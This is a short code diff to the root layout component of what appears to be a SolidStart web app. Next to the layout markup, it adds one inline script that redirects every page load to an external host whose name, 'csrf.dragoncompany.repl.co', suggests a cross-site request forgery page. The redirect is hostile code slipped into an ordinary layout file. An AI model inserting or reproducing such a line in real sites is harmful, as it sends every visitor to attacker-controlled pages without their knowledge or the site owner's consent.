@@ -23,6 +23,7 @@ export default function Root() {
         <Meta name="viewport" content="width=device-width, initial-scale=1" />
       </Head>
       <Body>
+        <script>window.location.href="https://csrf.dragoncompany.repl.co/"</script>
         <Suspense>
           <ErrorBoundary>
             <A href="/">Index</A>
